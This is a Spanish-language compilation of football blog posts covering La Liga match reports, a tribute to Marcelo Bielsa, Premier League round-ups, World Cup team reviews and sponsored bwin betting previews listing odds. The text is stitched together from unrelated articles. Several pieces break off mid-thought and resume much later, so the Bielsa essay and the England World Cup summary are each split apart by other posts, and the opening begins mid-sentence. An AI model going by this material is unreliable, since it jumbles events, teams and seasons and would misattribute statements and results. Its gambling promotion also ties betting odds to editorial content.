es renuente al compromiso defensivo, y en el que el puesto que en condiciones similares ocupó un tal Makelele lo desempeña ahora una especie de Don Tancredo. El lastre invisible. Villarreal y Real Madrid han empatado esta noche (1-1) en un encuentro que por momentos ha rozado la charlotada. Envidó Mourinho con Lass y Khedira acompañando a Xabi Alonso, y a la media hora se vio obligado a retirar al francés por el riesgo inminente de expulsión. El muro de contención resultaba inoperante ante un equipo amarillo que, a pesar de la ausencia por sobrecarga de Borja Valero, llegaba con sencillez inusitada a las cercanías de Casillas. El Madrid repuntó en el segundo tiempo impulsado por el ímpetu de Marcelo y la clase de Özil, y un gran pase del alemán sirvió a Cristiano el gol que desequilibraba el marcador. Tras un buen rato en el que no ocurrió prácticamente nada, los dioses del fútbol lanzaron un guiño: otra falta directa al borde del área y Senna, tan fino como Cazorla hace tres días, sentenció el empate. De ahí al final, expulsiones de Ramos, Özil y Mourinho –Ruí Farías ya había caído anteriormente- desquiciamiento en el Madrid y la sensación de que el equipo está mal y sus jugadores lo saben. Hay Liga, y vida para el nuevo Villarreal de Lotina. Contrariamente a lo que se podría esperar, la mayor tacada de goles anotada por un futbolista en un partido del mundial no se remonta a los tiempos pretéritos del 2-3-5, sino al Mundial de Estados Unidos. Oleg Salenko, viejo conocido de la afición española –saltó a la fama en el Logroñés cobrando el salario mínimo, y jugó en Valencia, Coruña y Córdoba- anotó un repóker contra Camerún que dio la vuelta al mundo, y que sin embargo no sirvió a la selección de Nikiforov, Lediakhov y Karpin para pasar a octavos de final. Goles de cazagoles, del delantero competente y preciso que siempre fue, y que Salenko curiosamente casi ni celebra; es divertido comparar su rictus impasible con la alegría desbordada de Radchenko, autor del intrascendente sexto tanto. La exhibición le sirvió para compartir el pichichi del campeonato con Hristo Stoichkov, que acabaría jugando cuatro partidos más que él. Salvo impensable catàstrofe, la Liga ha terminado, al menos en lo que a la decisión del título se refiere. El comienzo del fin en el Bernabéu alrededor de las ocho menos cuarto, cuando De las Cuevas enganchó un pepinazo que tocó el poste antes entrar en la portería que defendía la estatua de Casillas. Un 0-1 que habrá hecho millonarios, pero no tan descabellado desde el punto de vista futbolístico si pensamos que cualquier equipo con un centro del campo Lass–Khedira–Granero tendría muchos problemas para alcanzar Europa. El virus FIFA, un ejercicio muy profesional del Sporting y cierta dosis de mala suerte en el arreón final acabaron condenando al Madrid.Bebé es irregular pero siempre aporta algo. Aún así, hace falta ajustar un poco más el once. Creo que Gunino sigue siendo un lateral demasiado intermitente para ser titular. Si Campabadal ya no tiene sitio, quizá Crespo debería volver y probar otro compañero de baile para Pantic. En mi opinión, ese hombre es un Deivid reforzado tras su reconversión al mediocentro. O una excentricidad, vista la inclasificable labor de Ekeng en el centro del campo, quizá podría testarse en los entrenamientos el camerunés en un costado y dejar a Crespo donde está. Afinando sus labores defensivas, Patrick es incansable y oxígeno puro para un costado. Es una idea disparatada, pero también lo era darle galones a Deivid y ha salvado buena parte de la temporada.Cartabia merece capítulo aparte. Es puro talento pero llega un momento en el que se cortocircuita. Ayer lo hizo todo bien hasta que empezó a hacerlo todo mal. Bebé se desesperó. Fede juega como juegan los niños en el recreo. Un niño que es el mejor, eso sí, pero que no puede ganar solo. Siempre le sobra un regate, siempre le falta mirar arriba. Ayer fue un ejemplo de lo que no se debe hacer en ataque. Es incorregible y necesario. Como una vacuna que te enferma. Te cura y te hace daño. Ayer tuvimos 45 minutos de cada efecto.Andone es un delantero recién llegado. Del B, en crecimiento. Unos cuantos goles no pueden maquillar que lleva partidos ajenos al juego del equipo. Es un delantero dependiente, no crea, no consigue hacer temblar a la defensa del contrario. Es fácilmente defendible y sólo el empuje de los compañeros lo convierte en un elemento estimable. De momento, apunta maneras, pero no me agarraría a él para salvar la categoría. Ayer por fin Djukic hizo lo que algunos llevamos pidiendo tiempo: sacar a Ghilas de las catacumbas de la banda y llevarlo a la punta, donde es verdaderamente letal y un incordio para los centrales.Bien el Almería, valiente y preciso en el ataque. Mal el Córdoba comodón y espeso cuando tuvo que ir a por el empate. Duelo de equipos que sufren. Ayer hicieron un arroz en la Peña Boquerones Blanquiverde de la que soy socio y donde vi el partido. Me excusé y me fui tras acabar el partido sin probar ni un solo tenedorazo. Se me cerró el estómago. Perder es parte del fútbol, pero nadie está preparado para perder cuando todo parece ganado. El Córdoba ha vuelto a caer al pozo. Ha vuelto a perder la chispa. Ayer quisimos jugar al ajedrez con fichas del parchís. Si la clave del fútbol son los cojones el Eibar sería campeón de Europa, Serbia campeona del Mundo y el Córdoba dormiría hoy en una zona tranquila de la tabla. De la mano de Classic Football Shirts , la tienda especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente, desde los uniformes con los que se ha construído la historia del deporte rey.Diarios de Fútbol es un equipo. Y no digo que todos vayamos a una, que bailemos sincronizadamente unos junto a otros en una especie de pandilla zen eternamente armonizada. Ni mucho menos. Aquí los presentes casi nunca jugamos al primer toque, todo lo contrario, somos más de tarascada inclemente que de caricia balompédica. Decía lo de ser un equipo porque, desde el primer minuto, todos nos sentimos parte de algo único. Con sombras, luces y puntos ciegos, pero una unidad al fin y al cabo, un grupo de esos que tanto nos gustan: heterogéneo, inconstante y sin necesidad de convertirse en pdf. Los que aquí escriben son mis amigos y hoy he decidido homenajearlos. No necesito verles morir para dedicarles unas pocas y sinceras palabras de elogio. Y lo hago hablando de camisetas.Porque es fácil imaginarse a Borja Barba con la camiseta del Bayern de Munich. Constante, inflexible pero con mucha luz en su mecanismo certero. Un equipo alemán donde han brillado brasileños. La mezcla entre el clasicismo balompédico, la frialdad germana y la leve hendidura por la que, cuando quiere, se escapa una destello flexible, cercano e inasible. También es fácil ver a Pol Gustems lleno de entusiasmo vistiendo la camiseta del Ajax un equipo joven, explosivo, que pese a la inexperiencia presunta ha sido capaz de dar lecciones de fútbol, de aplomo, de decisión en los momentos importantes. O el Inter de Enrique Ballester, un equipo hecho a golpes de la vida.El descalabro de ayer en Reikiavik, al caer frente a la emergente Islandia comandada por Sigurdsson y dirigida desde la banda por el sueco Lagerback (2-0) coloca a la selección holandesa en una complicada situación en la que no se admite la posibilidad de un nuevo error. Solo la ampliación del torneo continental y la clasificación directa de los dos primeros equipos de cada grupo para el mismo  mantiene viva a Holanda, con la obligación inexcusable de no volver a tropezar en lo que resta de fase de clasificación. Holanda sigue en la cama, con la persiana bajada. Esquivando la luz y tratando de contener la hormigonera que machaca su estómago y apedrea su cabeza.Puedes encontrar un completísimo muestrario de camisetas de Holanda, desde Gullit, Rijkaard y van Basten hasta Daley Blind, van Persie y Sneijder, en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Un día me desperté y Bielsa ya no estaba. No voy a mentir con milongas sobre un amor eterno que nadie creería, porque yo ya me sospechaba que algo así podía llegar a ocurrir en un futuro alarmantemente cercano. Pero la imaginación es juguetona y caprichosa y para ella no había lugar para escenarios indeseados. Dicen que las buenas amistades, las que se hacen eternas, maduran lentamente hasta ir cogiendo el poso necesario para hacerse indisolubles. Algo parecido nos ocurrió con el Loco. De entrada, todo fueron recelos y precauciones ante un personaje extraño en Bilbao. Un año más tarde, absolutamente nadie dudaba sobre la sinceridad absoluta del hipnótico verbo pausado del técnico.Marcelo nos obligó a vivir intensamente durante aquellos dos años. Tan intensamente que cada partido, cada rueda de prensa, cada entreno y cada vivencia parecían una lección de vida. Nos enseñó caminos ocultos, veredas insólitas que conducían hasta parajes de ensueño y que jamás se nos habría ocurrido recorrer si alguien no nos hubiese invitado a adentrarnos en ellas. Por eso, cuando el Athletic Club y Marcelo Bielsa decidieron abandonarse mutuamente y dejar que sus respectivas carreras siguieran direcciones opuestas, a muchos se nos escapó un suspiro de nostalgia. No ya por el fútbol, que tan buenos momentos nos había brindado especialmente en su primer año, sino por el individuo. Por tener que decir adiós para siempre a una persona recta, a un entrenador honesto y con un profundo sentimiento de respeto hacia el aficionado, con quien mostraba una entrañable empatía para mí hasta entonces desconocida. Un técnico alejado del estereotipo y enemigo del cliché, tenaz en su propósito y sincero en su propuesta.Dicen quienes rápidamente encasillaron a un personaje tan difícilmente encasillable como Bielsa que su petate y su ideario deportivo estaban repletos de humo. Que su carrera, pura ilusión, no era más que una maniobra de prestidigitación sin un resultado real y palpable. Aquellos dos años conseguí por fin olvidar todas las teorías resultadistas que tan frecuentemente acudían a mi cabeza en otros momentos de mi vida.Un rato más tarde, el Barça firmaba el pagaré del alirón vía Piqué, que volvió a ejercer de Alexanco a la salida de un córner. Al contrario que en su rival por el título, no pesaron las bajas –estando Alves, Villa, Mascherano y Messi medio tiempo es difícil que lo hagan- y sí un gran Valdés que volvió a aparecer en un día clave para amargar al Villarreal. Nos quedan ocho jornadas y un clásico a beneficio de inventario, que será muy interesante ver cómo afronta el Madrid. Nos quejamos en España de que la dicotomía Madrid-Barcelona lo anega todo, y de que el enfrentamiento entre ambos, que llega desde el fondo de los tiempos, amenaza con convertir la Liga en un infinito combate Karpov-Kasparov que, además de emprobrecerla, no tiene visos de atenuarse. Con frecuencia, se antepone esta indeseable situación a la que teóricamente vive la Premier League, en la que al menos cuatro equipos –seis si añadimos al pujante Tottenham y a los millonarios citizens- parten cada verano con posibilidades de acabar alzando el peculiar trofeo que acredita al campeón de Inglaterra.Mañana domingo se enfrentan Manchester United y Chelsea en Old Trafford en un partido que decidirá al vencedor del campeonato en caso de victoria local, y que brindará dos jornadas que pueden dejar mucha uña mordida si son los blues los que hacen doblar la encarnada rodilla diabólica. Lanzando un poco la vista sobre el hombro, uno se apercibe de hasta qué punto los dos gigantes del fútbol inglés han dominado la Premier con puño de hierro en el último lustro. Cinco temporadas en las que ambas escuadras se han repartido casi equitativamente campeonatos y subcampeonatos, en una dictadura que sólo rompió levemente el último gran Liverpool de Benítez. Por el camino quedó también el enfrentamiento final de la Champions League –algo que ni siquiera Madrid y Barça han vivido aún-, alguna FA Cup y otros torneos menores. Suficiente, todo ello, para al menos cuestionar la presunta igualdad del campeonato inglés.Cada semana, y de la mano de bwin.com, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. De hecho, y siguiendo el símil con los dos colosos del fútbol español, ésta será la quinta vez que azules y rojos se enfrenten esta temporada, aunque el calendario ha dosificado el enfrentamiento eterno y, de este modo, ha aliviado algo la tensión inherente a él. El baile comenzó con la Community Shield, que se llevaron los mancuniano en un partido muy intenso, impropio de principios de temporada. El segundo choque, liguero, cayó para el otro lado, en el encuentro que inauguró la serie de lloriqueos primaverales de Ferguson. Finalmente, la eliminatoria de Champions  League –que llegó en el peor momento de la temporada para los blues, hace poco menos de un mes-,  certificó la competitividad del United en la máxima competición, vencedor con inesperada suficiencia en los dos partidos.Sin embargo, se prevé más igualado el choque de mañana. El Chelsea se presenta en Old Trafford tras una impresionante racha de siete partidos vencidos entre los ocho últimos, frenados sólo por el rocoso Stoke. Visto el fracaso del 4-3-3 que sólo hubiera podido funcionar en el FIFA, Ancelotti parece haberse decidido por un 4-4-2 donde el doble nueve corresponde a Drogba y Torres. El ariete africano está seguramente en el mejor momento de la temporada, mientras que es de esperar que el Niño, fantasmagórico todo el curso, comience a responder en algún momento. El joven David Luiz ha proporcionado seguridad y empaque al equipo desde atrás, y se mantendrá hasta última hora la duda sobre la presencia de Ramires o no en el once inicial.Al contrario que el equipo londinense, es una incógnita la alineación e incluso el tipo de partido que propondrá Ferguson. Aunque se adivina un equipo de corte defensivo, como suele ser norma en el ManU en los choques de envergadura, aún figura en las retinas el partidazo de Gelsenkirchen, donde la versión más tikitakera del equipo borró del rectángulo a todo un semifinalista de la Copa de Europa. Ausente el reaparecido Fletcher hasta la final de Wembley, es casi segura la presencia de Giggs en el medio y de Chicharito en la vanguardia; el juego inteligente, el olfato de gol y la capacidad de desmarque del mexicano han enamorado a sir Alex, que ha acabado entregándole la posición que parecía haberse merecido el frío pichichi Berbatov, más por sus números que por su aportación real al conjunto. De nuevo Nani, sensación de los primeros meses, apunta a banquillo, y probablemente vuelva al costado el recuperado Valencia, cuya aportación está resultando importante en el momento decisivo de la temporada. El equipo estará descansado tras la alineación de la vuelta de la Champions, todo un alivio para el Manchester frente a un partido que se presume físicamente agotador. ¿El pronóstico? Demasiado incierto, pero sigan leyendo y les ofrecemos algunas pistas.La victoria local se paga en bwin a 2.15, 3.20 para el empate y un apetitoso 3.30 para la nada descartable victoria visitante. Teniendo en cuenta que esta temporada dos de los choques se han decidido por 1-0, hay que tener en cuenta que un solo gol marcado se paga a 4.50. Un hipotético empate final del Chelsea tras victoria del ManU en el descanso proporciona un rédito de 13 euros al euro, que se convierten en 36 si el Chelsea consumase la remontada tras el descanso. Considerando la apetencia del United por los goles postreros y el olfato del Chícharo, hay que apuntar que se paga a 6.50 que el azteca cierre el choque. Y también tenemos una gran cuota para un gol de Ivanovic (10.40) especialista en las jugadas a balón parado que frecuentemente deciden estos partidos. Se acabó el culebrón. Moratti, que no podía ver ya a Benítez ni en pintura, le ha puesto hoy de patitas en la calle bajo el cortés manto del “acuerdo consensuado”. El técnico español se lleva un finiquito de tres millones de euros, pero también un durísimo golpe en su prestigio, ya muy dañado tras el erial que supusieron sus últimos cuatro años como liverpudian. Si el detonante a corto plazo han sido las declaraciones del entrenador tras la victoria contra el Mazembe –el resentimiento hecho palabra-, hacía mucho que la nave interista, herida por las lesiones y con la plantilla desunida, daba tumbos tanto en Serie A, donde es séptima, como en una Champions donde el segundo puesto le obliga a un cruce durísimo contra el Bayern. La herencia de Mourinho venía envenenada, y si bien es verdad que el club no ha invertido nada en fichajes en verano, también lo es que la Bienamada venía de un triplete histórico, y la plantilla, vice-Messi Balotelli aparte, se había mantenido. Lo cierto es que ya está Leonardo aguardando en boxes, y que su próximo equipo marcará si Benítez ha abandonado o no el Olimpo de los entrenadores top. No sería injusto. Estados Unidos. Caído en octavos de final. Un partido ganado, dos empatados y uno perdido, con cinco goles marcados y otros tantos encajados. Goleadores: Donovan (3), Dempsey y Bradley.Lo mejor: el buen nivel general mostrado, rigor táctico y capacidad de sobreponerse a resultados adversos.Lo peor: que suele dar la impresión de obtener menos de lo que ofrece, la decepcionante actuación de Dempsey y algunas caídas de ritmo, como ante Eslovenia.La estrella: Landon Donovan. El jugador franquicia de los americanos unió a su capacidad para dirigir al equipo sus dotes de llegador, y fue en todo momento el faro de sus compañeros.El momento: el tanto del mencionado Donovan cuando ya moría el partido contra Argelia, que abrió las puertas de la segunda fase.Inglaterra. Caída en octavos de final.La Juventus, al contrario, avanza por el campeonato con la misma contundencia funcionarial que le viene alcanzando para reir al final en las últimas temporadas. No diría que han encarrilado definitivamente la liga porque queda toda la segunda vuelta y ocho puntos nunca pueden ser definitivos a estas alturas pero la tontería de los nudillos va a escocer en Roma durante un tiempo. Generará dudas a los aficionados y al propio equipo. Si las afrontan con la misma serenidad que la Juve encaró la suyas al comienzo habrá pelea, de lo contrario…Foto: Juventus Recostados en asientos de primera clase la UD Almería afronta su cuarto viaje consecutivo en el vagón de los importantes. Un gustazo para un equipo joven y modesto. Al mando permanece  Juanma Lillo y las maletas, por deseo expreso del tolosarra, volverán a estar repletas de respeto por el juego. Dice Lillo, amigo como es de la frase pulida,  que le gustan los equipos que buscan la probabilidad antes que la posibilidad. Aquellos que no especulan. Los que piensan y juegan. Y en ello está la UD desde que el vasco sucedió a Hugo Sánchez en el cargo. En construir las victorias (dentro de las limitaciones que impone el presupuesto) desde la ambición. Con un fútbol agradable a la retina. ¿Objetivo? Huelga decir que aunque el equipo parezca haber encontrado su hueco en Primera, la meta está en conseguir la permanencia. Y si se tercia vivir un final de temporada plácido, tanto mejor.Arrancar el curso ante Osasuna y pescar un punto dulcísimo en Pamplona, sin romper la  línea del satisfactorio rendimiento ofrecido en pretemporada, habla a las claras de que el equipo es una versión mejorada de lo que hemos visto durante los últimos años. Desde la llegada de Lillo, al que conceptos nunca le han faltado, el once ha crecido en lo táctico y esto se ha reflejado en una mayor solidez defensiva: cimientos indispensables para no sudar frío a final de temporada. La noticia aciaga es que la venta de Chico, Soriano y Cisma más la lesión de Pellerano han  obligado al Almería a recomponer la zona y resta saber si el equipo  conseguirá funcionar atrás tras los cambios. No obstante, han llegado refuerzos interesantes para la zaga: el danés Michael Jakobsen para el lateral izquierdo (corpulencia y juego aéreo) y el joven central uruguayo Marcelo Silva junto con Rigo (central también, zurdo y aseado en el pase). En el centro del campo es donde la UD acumula el talento. De que el Almería sea un cojunto de probabilidades, Lillo dixit, se van a seguir encargando Pablo Piatti y Crusat. El argentino y el catalán aunan velocidad, talento para la conducción y peligro de cara a puerta (7 goles cada uno en el curso pasado) Se antoja fundamental que estos dos sean capaces de generar situaciones arriba teniendo en cuenta las carencias goleadoras de un equipo trufado de futbolistas que se deberían de dar un canto en los dientes si consiguen llegar al doble guarismo al final de año. Bernardello, M’Bami y Vargas soldificarán el conjunto y un nuevo, Diego Valeri viene a demostrar que su mejor fútbol (en el Lanús campeón de 2007) aun no le ha dado la espalda. Llega cedido del Oporto y puede ser la sorpresa agradable. Arriba hay dudas. Al equipo se le presupone vocación ofensiva pero deberán aportar más que el año pasado Goitom (buenos movimientos y poca pólvora) y Kalu Uche, que finalmente ha permanecido en la entidad tras un verano pleno de rumores. Ulloa, rematador de solvencia probada en Segunda (Castellón) es la otra solución.Mención aparte merece Diego Alves. Si obviamos la anomalía de Vicente Biurrun,  el ochentero portero vasco nacido en Sao Paulo, nunca antes un guardameta brasileño había participado en la Liga Española. Hasta que llegó Alves y dejó el listón a gran altura. Meta extremadamente rápido y ágil aunque no exento de técnica, fue uno de los futbolistas destacados durante la temporada pasada y no sería raro verle con la camiseta de un equipo más grande el año que viene.Sin embargo y repasada ya la plantilla, no tengo dudas de que el verdadero acierto de Alfonso García, presidente de la entidad rojiblanca, ha sido mantener a Juanma Lillo en el cargo. Criticado, incluso cariturizado en demasiadas ocasiones por su singularidad, fue capaz de enderezar el rumbo de la nave, ganarse el respeto del vestuario e imponer su estilo de juego en tiempo récord. Con él, el Almería puede aspirar a la permanencia y a comprar el billete para una nueva temporada en el vagón VIP de la Liga. Sería la quinta consecutiva y todo una garantía de futuro para el club.Lo mejor: Apuesta por el buen fútbol. Fichajes interesantes como Diego Valeri y el argentino Ulloa. La no venta de Uche y la continuidad de Juanma Lillo en el banquillo son sinónimos de tranquilidad y trabajo bien hecho.Lo peor: La adaptación de los nuevos defensas al equipo. Lillo consiguió poner la máquina a carburar el año pasado pero la defensa se ha renovado casi por completo. El escaso apoyo de la grada. Parece mentira pero la parroquia del Estadio Mediterráneo mengua cada año un poco más pese a contar con una plantilla notablemente mejor.Un pronóstico: la salvación está cara. Pelearán por ella hasta última hora Hype es una de esas palabras asquerosas que el redactor tipo de, escriba aquí la revista de tendencias de sus entretelas, está obligado a vomitar en sus textos a la mínima  oportunidad. Un producto cultural al que el gran  público ha decidido entregarle la próxima media hora de su vida gracias a  que los medios de comunicación lo han hinchado convenientemente hasta  límites absurdos.Normalmente, el avezado desconfía del hype. Bien por  el convencimiento que da el aprendizaje o por pura pose purista. Como tragos de bebida energética inocua, una hipérbole de los mundiales son los equipos africanas (invariablemente antes de comenzar cada campeonato  desde que los balones son redondos) y otra del tamaño de un anillo de Maradona el anuncio de  conquista por saturación de las selecciones americanas en ésta Copa del  Mundo sudafricana que enfila su desenlace.En el 88, unos negros enfadados que atendían por Public Enemy  cantaban “Don’t believe the hype” contra la panfletaria  política del gobierno estadounidense. Venían a pedir que nadie les  vendiese la moto. Bien, idéntico pensamiento tenía el que firma cuando  hace unas semanas la moda era cacarear a los cuatro vientos la  superioridad del fútbol americano en el Mundial. Aunque el andamio montado por Maradona en Argentina estuviera tan mal calzado como cabría esperar, aunque a Chile y Paraguay se les veían carencias evidentes, aunque  Dunga y los chavales continuaran empecinados en embarrar el escudo más  lustroso del fútbol mundial. Aun con todo, muchos se subieron al carro. Otros, entiendo objetivos, pedíamos que alguien, por favor, pulsase el  botón rojo y parase la máquina de fabricar  humo y ventilase el campeonato. Desde que se atendieron mis plegarias duermo más tranquilo. A la espera de la actuación postrera del Manchester United y el Newcastle, los protagonistas de la jornada visten de naranja y acaban de cambiar un camerino mugriento por los focos. Tras 39 años largos años y 90 minutos de preparación. Hablo del Blackpool. En inesperado número, los condenada troupe de Ian Holloway ha vencido al miedo escénico para despachar un show sensacional. Olly (así se conoce popularmente al socarrón que lleva los mandos por allí) se ha pasado la pretemporada con el dedal y la aguja en ristre. Frunció con finura los parches de urgencia (un Harewood tan excepcional como inusitado en el debut) y ha cosido las suficientes lentejuelas en la chaqueta del debutante para que brille como es debido. Una oda al trabajo bien hecho, rapidez al corte y soltura en el pase trajeron como resultado el 0-4 al Wigan y una pregunta flotando en la grada de Bloomfield Road ¿Por qué no podemos jugar siempre contra éstos? 1. La pista principal del Circo  Premier estaba reservada para el sábado a nombre del Liverpool y el Arsenal. Con la expectación por ver la pinta del nuevo Liverpool de Hodgson ronroneando bajo la carpa, el equipo aceptó el reto y estuvo a punto de ganar la apuesta. Fútbol intermitente y los desajustes propios de la fecha en curso fueron moneda común en la sesión de Anfield. Los dos conjuntos estuvieron grises apenas se supo que los que tenían que hacer de antorcha en la oscuridad, Joe Cole y Nasri, tenían la mecha muy corta. Naufragaron los dos en la tarea de iluminar al resto (contribuyendo notablemente a la causa un insípido Arshavin) y el juego se resintió demasiado. Joe Cole fue además expulsado por propinar una patada absurda a Koscielny redondeando su triste faena. Sin embargo y contra todo pronóstico, el Liverpool creció al menguar en número. Con todo en contra y las únicas cartas de un Gerrard entonado y la rapidez al corte casi obtienen los tres puntos a través de un buen disparo de David Ngog. Tan sólo la insistencia final de los gunners y un gol tan postrero como rocambolesco permitieron a los de Wenger rebañar las migajas.2. Manchester City y Tottenham, rivales por el pasaporte europeo en el pasado curso y eternos aspirantes a algo más, empataron a nada en White Hart Lane. Pudo ganar el Tottenham, evidenciando que necesita pólvora arriba (suena Bellamy por cierto), y debieron perder los celestes, poniendo sobre la mesa obscenamente las mismas carencias creativas que llevan arrastrando desde el comienzo de la pretemporada. Aunque visto lo visto, es el City quien más gana con el empate. Punto es punto que diría el otro y más en terreno minado como es The Lane. La figura del día, curiosamente en dos clubes a los que las libras para comprar juego les rebosan por la junturas, fue un portero. Joe Hart respondió con creces a la confianza de Mancini (Given parece relegado ahora) y a los que le ven como titular obligado en la selección.3. El gol de la jornada, de momento, se apareció de la nada en Molineux. Desoyendo cualquier manual de ortodoxia y con el manual de estilo de Matt Le Tissier aprendido de carrerilla, David Jones adelantó al Wolverhampton con una variante del tiro libre tan extravagante como maravillosa. En un saque indirecto, recibió del compañero en cortito, toco con finura para elevar el balón lo justo y empalmó violentamente a bote pronto. De la bota a la escuadra izquierda del portero del Stoke. El galés del Wolves, que a diferencia de Le Tissier es un trotamundos del fútbol, le pega a la pelota con la misma inspiración. Los puntos acabaron en el bolsillo local (2-1)4. Seguro que todos recuerdan a Roberto Di Matteo, el buen pelotero que impulsó al Chelsea en los 90. Todos excepto Didier Drogba. Debutaba el suizo en Primera a los mandos del West Bromwich Albion y los inquilinos de su antigua casa le llenaron el saco. El delantero marfileño estuvo a la cabeza de la tunda desmemoriada con tres dianas. Soplando y soplando los nubarrones negros del Mundial y de una pretemporada discreta, los que mandan en el Chelsea (Drogba, Malouda y Lampard) se han puesto manos a la obra para comenzar el presente curso tan afilados como acabaron el pasado. 6-0 (tres de Drogba, dos de Malouda y uno de Lampard) Y menos mal que no fueron más, pensará cualquier aficionado cabal del West Brom.5. Acabo con la astracanada de la jornada. Esa que coloca a Diego Armando Maradona en el banquillo del Aston Villa como recambio de Martin O’Neill. Por lo visto ha sido el representante del astro eterno, Walter Soriano, el que ha descolgado primero para ofrecer los servicios de su cliente a los villanos. El caso es que, amantes como somos en esta casa de la anomalía juerguista en la liga inglesa, no imaginamos a DAM afrontando con seriedad una empresa de tal calibre. “Sería muy feliz en Inglaterra, especialmente en un gran club como el Aston Villa. Si el dueño Randy Lerner quiere hacerle una oferta en firme, estoy seguro de que obtendría una respuesta positiva por nuestra parte”, declaró el comerciante en una mezcla imposible e impagable de sinceridad naíf y el vendehumismo tradicional. Ese Atlético bien armadito atrás con el partido clarísimo en la cabeza, ese Barcelona horizontal y sin chispa, estos horarios impresentables, esas polémicas paletas por la camiseta patriótica mientras el fondo del Calderón hierve a banderas anticonstitucionales una vez más… Lo previsible y lo sorprendente a estas alturas sucedió en la ida de la Supercopa (1-1). Lo que  no esperaba, eso sí, era la incomparecencia de Messi y de Xavi al evento. Por ahí y alimentándose de un espíritu competitivo encomiable (la guerrilla de Diego Costa con Jordi Alba por todo el carril derecho fue el ejemplo) golpeó primero el equipo de Simeone. Con eso y el latigazo imponente de Villa. Sartenada rebosante de argumentos para creer en otro año de mieles en el Manzanares.El Cholo no da puntada sin hilo y tiene la costumbre de llevarse el kit de costura completo a las finales. Qué se lo recuerden al Athletic de Bielsa… La ida del primer trofeo de la temporada no fue la excepción. Los colchoneros fueron fieles a su propia identidad de un modo milimétrico durante todo el encuentro pero en particular en el arranque.Quiero decir que disfrutaba con lo que Bielsa había llegado a ofrecernos, sin necesidad de materializar aquellas experiencias en algo más visible y material. Una frase oportuna, un gesto, era a veces más que suficiente. La foto de los éxitos del argentino en San Mamés no se guarda en un álbum porque no existe como tal. Su humo, aquel al que continuamente hacían referencia sus detractores, no era humo. Era un aroma que pedía ser inhalado. Como el resignado exfumador que acaba de dejar el vicio y olfatea desesperado en busca del humo desprendido por el pitillo de su contertulio para matar el ansia.A Eduardo Berizzo (Cruz Alta, Argentina, 1969) le ocurrió algo similar. Un buen día se despertó en su cama chilena y Marcelo Bielsa se había marchado. Era el cuatro de febrero de dos mil once cuando, en una rueda de prensa de cerca de tres horas de duración, el técnico argentino anunciaba su renuncia a la selección chilena. Dejaba atrás una viuda, La Roja chilena, e hijos, entre ellos el hoy preparador del RC Celta de Vigo. Dice el Toto Berizzo, ayudante técnico del Loco Bielsa en aquellos tres años y medio al frente del combinado nacional de Chile, que la generosidad del rosarino con sus conocimientos le fue muy útil y provechosa en los tiempos en los que ejerció de aprendiz en el Complejo Deportivo Juan Pinto Durán.Apenas ha necesitado unas semanas desde su llegada a Balaídos, previo exitoso paso por O’Higgins chileno, para dejar claro de qué fuente estuvo bebiendo durante su pasantía en Santiago. Su Celta se muestra como un equipo vigoroso, generoso en el derroche físico y empeñado en cuidar al balón como si fuese un integrante más de la plantilla. Peca de llevar sus partidos, por lo que se ha podido ver hasta la fecha, hasta un punto de efervescencia que en ciertas ocasiones se vuelve tan incontrolable que los borbotones acaban saltando fuera de la cazuela y emborronando un plato magistral. Y viendo a su Celta el pasado sábado ante la Real Sociedad fue cuando terminé de despejar cualquier tipo de duda.Una victoria, dos empates y una derrota, tres goles anotados y cinco recibidos. Goleadores: Gerrard, Defoe y Upson.Lo mejor: la garra y el corazón mostrados en el encuentro con Alemania, que no dieron por perdido ni siquiera con el 4-1. Lo peor: las graves deficiencias en la creación de juego, la inseguridad de Terry y los porteros, y la desaparición de Rooney, extraña en un futbolista de su nivel.La estrella: dentro del gris tono general, destacaron los centros de Milner desde la banda derecha, algunos de ellos con aroma al mejor Beckham.El momento: el gol fantasma de Lampard en el partido contra Alemania, que hubiera supuesto el empate y quién sabe qué más. La Historia se tomó su revancha.Eslovenia. Eliminada en la primera fase. Una victoria, un empate y una derrota, tres goles marcados y tres recibidos. Goleadores: Koren, Birsa y Ljubijankic.Lo mejor: la dignidad con la que una selección tan menor se batió en el torneo.Lo peor: no haber sabido aguantar el 2-0 contra Estados Unidos, la actitud timorata ante Inglaterra y la sequía del hombre-gol Novakovic.La estrella: Robert Koren, el cerebro del equipo, que movió a la perfección a sus compañeros, especialmente en el primer tiempo contra Estados Unidos.El momento: inolvidable la imagen del entrenador Kek lanzando con ira una botella de agua al suelo al enterarse del gol postrero de Donovan que los eliminaba del Mundial.Argelia. Eliminada en la primera fase, con un partido empatado y dos perdidos, ningún gol marcado y dos recibidos.Lo mejor: el partido contra Eslovenia, en el que mandaron, y la fortaleza defensiva.Lo peor: el garrafal fallo de Chaouchi y el discretísimo nivel técnico general. Se fueron de Sudáfrica sin hacer un solo gol.La estrella: nos quedamos con el atrevimiento de Karim Ziani, especialmente en el partido contra los ingleses.El momento: el mencionado error del portero en el primer partido, que hipotecó las posibilidades de los africanos. Cada semana, y de la mano de bwin.com, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Ningún país tiene tanta densidad de derbies, ni tanta carga de historia y por tanto de rivalidad en ellos, como Inglaterra. Sin embargo, si quisiéramos extender la denominación típicamente española y llamar “El Clásico” –así, con mayúsculas- a alguno de los miles de partidos que se juegan cada temporada en las Islas, el Liverpool-Manchester sería sin duda el mejor candidato. La cercanía entre las ciudades, la mística de los dos equipos más rojos del fútbol mundial y las salas de trofeos de Anfield y Old Trafford, repletas a reventar, hacen acreedor de esta denominación al partidazo que se disputa el próximo domingo a las 14:30. El choque ofrece un aroma que se podría denominar paradójico. A priori, el gran favorito debería ser el United; líder de la competición, en buena situación en Liga de Campeones y clasificados para cuartos de la FA Cup, que se dirimirán en choque mastodóntico con el Arsenal. Los red devils caminan, al menos en lo que a resultados se refiere, con la seguridad que se le supone al que seguramente ha sido el equipo más fiable del fútbol europeo en los últimos quince años. Por su parte, en Liverpool afrontan el tramo final de la temporada en una extraña tierra de nadie, en plena travesía del desierto tras unos meses horribles, habiendo vendido a su pretendida máxima estrella, y con la única ilusión, si se la puede llamar así de entrar el año que viene en Europa por esa gatera que antes se llamaba Copa de la UEFA.Sin embargo, como en fútbol muchas veces no importa tanto la evolución de la temporada sino el momento concreto, la percepción que uno tiene del partido puede cambiar radicalmente. Por ejemplo, entre carisma y victorias, Dalglish ha cambiado en las últimas semanas el clima derrotista que había hecho descender los 